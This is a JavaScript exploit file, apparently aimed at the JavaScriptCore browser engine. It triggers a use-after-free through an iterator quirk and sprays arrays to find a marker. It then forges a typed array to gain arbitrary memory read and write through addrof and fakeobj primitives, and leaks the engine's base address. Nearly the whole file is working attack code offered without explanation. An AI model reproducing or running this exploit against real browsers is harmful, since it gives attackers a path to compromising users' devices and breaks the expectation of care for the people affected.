// used for addrof/fakeobj
var leak = undefined;
var leak_addr = undefined;

// used for view
var slave = undefined;
var master = undefined;

var BigInt = class {
  /**
   * @param  {[number, number]|number|string|BigInt|ArrayLike<number>}
   */
  constructor() {
    var lo = 0;
    var hi = 0;

    switch (arguments.length) {
      case 0:
        break;
      case 1:
        var value = arguments[0];
        switch (typeof value) {
          case "boolean":
            lo = value ? 1 : 0;
            break;
          case "number":
            if (isNaN(value)) {
              throw new TypeError(`Number ${value} is NaN`);
            }

            if (Number.isInteger(value)) {
              if (!Number.isSafeInteger(value)) {
                throw new RangeError(`Integer ${value} outside safe 53-bit range`);
              }

              lo = value >>> 0;
              hi = Math.floor(value / 0x100000000) >>> 0;
            } else {
              BigInt.View.setFloat64(0, value, true);

              lo = BigInt.View.getUint32(0, true);
              hi = BigInt.View.getUint32(4, true);
            }

            break;
          case "string":
            if (value.startsWith("0x")) {
              value = value.slice(2);
            }

            if (value.length > 16) {
              throw new RangeError(`String ${value} is out of range !!`);
            }

            while (value.length < 16) {
              value = "0" + value;
            }

            for (var i = 0; i < 8; i++) {
              var start = value.length - 2 * (i + 1);
              var end = value.length - 2 * i;
              var b = value.slice(start, end);
              BigInt.View.setUint8(i, parseInt(b, 16));
            }

            lo = BigInt.View.getUint32(0, true);
            hi = BigInt.View.getUint32(4, true);

            break;
          default:
            if (value instanceof BigInt) {
              lo = value.lo;
              hi = value.hi;
              break;
            } else if (ArrayBuffer.isView(value) && value.byteLength === BigInt.View.byteLength) {
              BigInt.View.buffer.set(value);

              lo = BigInt.View.getUint32(0, true);
              hi = BigInt.View.getUint32(4, true);
            }

            throw new TypeError(`Unsupported value ${value} !!`);
        }
        break;
      case 2:
        hi = arguments[0] >>> 0;
        lo = arguments[1] >>> 0;

        if (!Number.isFinite(hi)) {
          throw new RangeError(`hi value ${hi} is not an integer !!`);
        }

        if (!Number.isFinite(lo)) {
          throw new RangeError(`lo value ${lo} is not an integer !!`);
        }
        break;
      default:
        throw new TypeError("Unsupported input !!");
    }

    this.lo = lo;
    this.hi = hi;
  }

  get d() {
    var hi_word = this.hi >>> 16;
    if (hi_word === 0xFFFF || hi_word === 0xFFFE) {
      throw new RangeError(`${this} cannot be represented as double`);
    }

    BigInt.View.setUint32(0, this.lo, true);
    BigInt.View.setUint32(4, this.hi, true);

    return BigInt.View.getFloat64(0, true);
  }

  get jsv() {
    var hi_word = this.hi >>> 16;
    if (hi_word === 0 || hi_word === 0xFFFF) {
      throw new RangeError(`${this} cannot be represented as JSValue`);
    }

    return this.sub(new BigInt(0x10000, 0)).d;
  }

  valueOf() {
    if (this.hi <= 0x1FFFFF) {
      return this.hi * 0x100000000 + this.lo;
    }

    BigInt.View.setUint32(0, this.lo, true);
    BigInt.View.setUint32(4, this.hi, true);

    var f = BigInt.View.getFloat64(0, true);
    if (!isNaN(f)) {
      return f;
    }

    throw new RangeError(`Unable to convert ${this} to primitive`);
  }

  toString() {
    BigInt.View.setUint32(0, this.lo, true);
    BigInt.View.setUint32(4, this.hi, true);

    var value = "0x";
    for (var i = 7; i >= 0; i--) {
      var c = BigInt.View.getUint8(i).toString(16).toUpperCase();
      value += c.length === 1 ? "0" + c : c;
    }

    return value;
  }

  swap() {
    [this.hi, this.lo] = [this.lo.swap32(), this.hi.swap32()];
  }

  getBit(idx) {
    if (idx < 0 || idx > 63) {
      throw new RangeError(`Bit ${idx} is out of range !!`);
    }

    return (idx < 32 ? this.lo >>> idx : this.hi >>> (idx - 32)) & 1;
  }

  setBit(idx, value) {
    if (idx < 0 || idx > 63) {
      throw new RangeError(`Bit ${idx} is out of range !!`);
    }

    if (idx < 32) {
      this.lo = (value ? this.lo | (1 << idx) : this.lo & ~(1 << idx)) >>> 0;
    } else {
      this.hi = (value ? this.hi | (1 << (idx - 32)) : this.hi & ~(1 << (idx - 32))) >>> 0;
    }
  }

  divmod(value) {
    value = value instanceof BigInt ? value : new BigInt(value);

    if (value === 0) {
      throw new Error("Division by zero");
    }

    var q = new BigInt();
    var r = new BigInt();
    for (var i = 63; i >= 0; i--) {
      r = r.shl(1);

      if (this.getBit(i)) {
        r.setBit(0, true);
      }

      if (r.gte(value)) {
        r = r.sub(value);
        q.setBit(i, true);
      }
    }

    return { q, r };
  }

  cmp(value) {
    value = value instanceof BigInt ? value : new BigInt(value);
    return this.hi !== value.hi ? (this.hi > value.hi ? 1 : -1) 
        : this.lo !== value.lo ? (this.lo > value.lo ? 1 : -1)
        : 0;
  }

  gt(value) {
    return this.cmp(value) > 0;
  }

  gte(value) {
    return this.cmp(value) >= 0;
  }

  lt(value) {
    return this.cmp(value) < 0;
  }

  lte(value) {
    return this.cmp(value) <= 0;
  }

  eq(value) {
    value = value instanceof BigInt ? value : new BigInt(value);
    return this.hi === value.hi && this.lo === value.lo;
  }

  neq(value) {
    value = value instanceof BigInt ? value : new BigInt(value);
    return this.hi !== value.hi || this.lo !== value.lo;
  }
  
  add(value) {
    value = value instanceof BigInt ? value : new BigInt(value);

    var lo = this.lo + value.lo;
    var c = lo > 0xFFFFFFFF ? 1 : 0;
    var hi = this.hi + value.hi + c;
    if (hi > 0xFFFFFFFF) {
      throw new RangeError("add overflowed !!");
    }

    return new BigInt(hi, lo);
  }

  sub(value) {
    value = value instanceof BigInt ? value : new BigInt(value);

    if (this.lt(value)) {
      throw new RangeError("sub underflowed !!");
    }

    var b = this.lo < value.lo ? 1 : 0;
    var hi = this.hi - value.hi - b;
    var lo = this.lo - value.lo;

    return new BigInt(hi, lo);
  }

  mul(value) {
    value = value instanceof BigInt ? value : new BigInt(value);

    var m00 = Math.imul(this.lo, value.lo);
    var m01 = Math.imul(this.lo, value.hi);
    var m10 = Math.imul(this.hi, value.lo);
    var m11 = Math.imul(this.hi, value.hi);

    var d = m01 + m10;
    var lo = m00 + (d << 32);
    var c = lo > 0xFFFFFFFF ? 1 : 0;
    var hi = m11 + (d >>> 32) + c;
    if (hi > 0xFFFFFFFF) {
      throw new Error("mul overflowed !!");
    }

    return new BigInt(hi, lo);
  }

  div(value) {
    return this.divmod(value).q;
  }

  mod(value) {
    return this.divmod(value).r;
  }

  xor(value) {
    value = value instanceof BigInt ? value : new BigInt(value);

    var lo = (this.lo ^ value.lo) >>> 0;
    var hi = (this.hi ^ value.hi) >>> 0;

    return new BigInt(hi, lo);
  }

  and(value) {
    value = value instanceof BigInt ? value : new BigInt(value);

    var lo = (this.lo & value.lo) >>> 0;
    var hi = (this.hi & value.hi) >>> 0;

    return new BigInt(hi, lo);
  }

  or(value) {
    value = value instanceof BigInt ? value : new BigInt(value);

    var lo = (this.lo | value.lo) >>> 0;
    var hi = (this.hi | value.hi) >>> 0;

    return new BigInt(hi, lo);
  }

  not() {
    var lo = ~this.lo >>> 0;
    var hi = ~this.hi >>> 0;

    return new BigInt(hi, lo);
  }

  shl(count) {
    if (count < 0 || count > 63) {
      throw new RangeError(`Shift ${count} bits out of range !!`);
    }

    if (count === 0) {
      return new BigInt(this);
    }

    var lo = count < 32 ? (this.lo << count) >>> 0 : 0;
    var hi = count < 32 ? ((this.hi << count) | (this.lo >>> (32 - count))) >>> 0 : (this.lo << (count - 32)) >>> 0;

    return new BigInt(hi, lo);
  }

  shr(count) {
    if (count < 0 || count > 63) {
      throw new RangeError(`Shift ${count} bits out of range !!`);
    }

    if (count === 0) {
      return new BigInt(this);
    }

    var lo = count < 32 ? ((this.lo >>> count) | (this.hi << (32 - count))) >>> 0 : this.hi >>> (count - 32);
    var hi = count < 32 ? this.hi >>> count : 0;

    return new BigInt(hi, lo);
  }
};

BigInt.View = new DataView(new ArrayBuffer(8));

Number.prototype.swap32 = function () {
  if (Number.isInteger(this) && this >= 0 && this <= 0xFFFFFFFF) {
    return ((this & 0xFF) << 24) | ((this & 0xFF00) << 8) | ((this >>> 8) & 0xFF00) | ((this >>> 24) & 0xFF);
  }

  throw new RangeError(`${value} is not 32-bit number`);
};

DataView.prototype.getBigInt = function (byteOffset, littleEndian) {
  littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

  var lo = this.getUint32(byteOffset, true);
  var hi = this.getUint32(byteOffset + 4, true);

  return new BigInt(hi, lo);
};

DataView.prototype.setBigInt = function (byteOffset, value, littleEndian) {
  value = typeof value === "undefined" ? new BigInt(value) : value;
  littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

  this.setUint32(byteOffset, value.lo, littleEndian);
  this.setUint32(byteOffset + 4, value.hi, littleEndian);
};

DataView.prototype.get_backing = function () {
  return view(addrof(this)).getBigInt(0x10, true);
};

DataView.prototype.set_backing = function (addr) {
  view(addrof(this)).setBigInt(0x10, addr, true);
};

DataView.prototype.set_length = function (length) {
  if (!Number.isInteger(length) || length < -0x80000000 || length > 0x7FFFFFFF) {
    throw new RangeError(`${length} is not 32-bit signed number`);
  }

  view(addrof(this)).setInt32(0x18, length, true);
};

Uint8Array.prototype.get_backing = function () {
  return view(addrof(this)).getBigInt(0x10, true);
};

Uint8Array.prototype.set_backing = function (addr) {
  view(addrof(this)).setBigInt(0x10, addr, true);
};

Uint8Array.prototype.set_length = function (length) {
  if (!Number.isInteger(length) || length < -0x80000000 || length > 0x7FFFFFFF) {
    throw new RangeError(`${length} is not 32-bit signed number`);
  }

  view(addrof(this)).setInt32(0x18, length, true);
};

function view(addr) {
  if (!(addr instanceof BigInt)) {
    throw new Error(`${addr} is not a BigInt !!`);
  }

  if (addr.eq(0)) {
    throw new Error("Empty addr !!");
  }

  if (addr.lo !== master[4] || addr.hi !== master[5]) {
    master[4] = addr.lo;
    master[5] = addr.hi;
  }

  return slave;
};

function addrof(obj) {
  leak.obj = obj;
  return view(leak_addr).getBigInt(0x10, true);
};

function fakeobj(addr) {
  view(leak_addr).setBigInt(0x10, addr, true);
  return leak.obj;
};

function make_uaf(arr) {
  var o = {};
  for (var i in { xx: "" }) {
    for (i of [arr]) {}
    o[i];
  }
};

function init_arw() {
  log("Initiate UAF...");

  var uaf_u32 = new Uint32Array(0x40000);

  uaf_u32[4] = 0xB0; // m_hashAndFlags

  make_uaf(uaf_u32);

  log("Achieved UAF !!");

  log("Initiate ARW...");

  var boxed = -1;
  var unboxed = -1;
  var marker = 0x1337;

  log(`Spraying array with marker ${new BigInt(marker)} ...`);

  var spray = new Array(0x1000);
  for (var i = 0; i < spray.length; i++) {
    var arr = spray[i] = new Array(0x10);
    for (var j = 0; j < arr.length; j++) {
      arr[j] = j % 2 === 0 ? marker : (j * 0x10000 + i);
    }
  }

  log("Looking for marker in uaf_u32...");

  for (var i = 0; i < uaf_u32.length; i++) {
    if (uaf_u32[i] === marker) {
      log(`Found marker at uaf_u32[${i}] !!`);

      unboxed = i + 2;
      boxed = [uaf_u32[unboxed] & 0xFFFF, (uaf_u32[unboxed] >> 16) & 0xFFFF];

      break;
    }
  }

  if (unboxed === -1 || boxed === -1) {
    throw new Error("Failed to find marker !!");
  }

  leak = { obj: 0 };

  spray[boxed[0]][boxed[1]] = leak;

  leak_addr = new BigInt(uaf_u32[unboxed + 1], uaf_u32[unboxed]);

  debug(`leak_addr: ${leak_addr}`);

  slave = new DataView(new ArrayBuffer(0x30));

  // spray Uint32Array to be used for fake Uint32Array structure id later
  var u32_spray = [];
  for (var i = 0; i < 0x100; i++) {
    u32_spray.push(new Uint32Array(1));
    u32_spray[i][`spray_${i}`] = i;
  }

  // try faking Uint32Array, we guess structure id by incrementing until it matches from one of sprayed earlier in u32_spray
  var indexing_type = 0; // IndexingType::NonArray
  var jstype = 0x23; // JSType::Uint32ArrayType
  var type_info = 0x60; // TypeInfo::InlineTypeFlags::OverridesGetOwnPropertySlot | TypeInfo::InlineTypeFlags::InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero
  var cell_type = 1; // CellType::DefinitelyWhite;
  var structure_id = 0x80; // StructureID

  var length_and_flags = new BigInt(1, 0x30);
  var jscell = new BigInt(indexing_type | (jstype << 8) | (type_info << 16) | (cell_type << 24), structure_id);

  var container = {
    jscell: jscell.jsv,
    butterfly: null, // NaN-boxed, fix later
    vector: slave,
    length_and_flags: length_and_flags.d, // NaN-boxed, fix later
  };

  spray[boxed[0]][boxed[1]] = container;

  var container_addr = new BigInt(uaf_u32[unboxed + 1], uaf_u32[unboxed]);

  debug(`container_addr: ${container_addr}`);

  var fake_addr = container_addr.add(0x10);

  debug(`fake_addr: ${fake_addr}`);

  uaf_u32[unboxed] = fake_addr.lo;
  uaf_u32[unboxed + 1] = fake_addr.hi;

  var fake = spray[boxed[0]][boxed[1]];

  while (!(fake instanceof Uint32Array)) {
    jscell.lo += 1;
    container.jscell = jscell.jsv;
  }

  // Fix fake
  fake[4] = fake_addr.lo;
  fake[5] = fake_addr.hi;

  slave.setBigInt(8, 0, true);
  slave.setBigInt(0x18, length_and_flags, true);

  // create valid Uint32Array as TypedArrayMode::WastefulTypedArray
  master = new Uint32Array(fake.buffer);

  // Fix slave
  slave.set_length(-1);

  // cleanup container
  delete container.jscell;
  delete container.butterfly;
  delete container.vector;
  delete container.length_and_flags;

  log("Achieved ARW !!");
};

init_arw();

var math_expm1_addr = addrof(Math.expm1);
var native_executable = view(math_expm1_addr).getBigInt(0x18, true);
var native_executable_constructor = view(native_executable).getBigInt(0x48, true);
var jsc_base = native_executable_constructor.sub(0x43E00);

log(`jsc base: ${jsc_base}`);